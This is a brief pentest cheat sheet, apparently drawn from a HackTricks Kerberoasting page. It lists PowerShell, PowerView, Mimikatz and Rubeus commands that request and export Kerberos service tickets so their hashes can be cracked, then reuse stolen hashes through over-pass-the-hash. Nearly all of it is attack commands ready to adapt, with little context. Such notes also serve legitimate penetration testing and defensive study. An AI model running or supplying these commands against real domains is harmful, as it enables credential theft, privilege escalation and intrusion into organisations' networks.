https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast

To see existing tickets
```powershell
klist
```

Remove all tickets
```powershell
klist purge
```

### PowerView
Request a kerberos service ticket for specified SPN.  By default the output is in Hashcat format
```powershell
Request-SPNTicket -SPN "CIFS/target.domain.local" [-OutputFormat JTR]
```
### Manually
By doing it manually, ticket is generated, it requires to be extracted to crack the hash
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "CIFS/target.domain.local"
```

Dump the tickets out
```text
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

Now, crack ’em
### Over-Pass the Hash
#### Rubeus
```powershell
Rubeus.exe asktgt /user:USER < /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/opsec] /ptt
```
#### Mimikatz
```powershell
sekurlsa::pth /user:Administrator /domain:target.domain.local < /ntlm:hash | /aes256:hash> /run:powershell.exe
```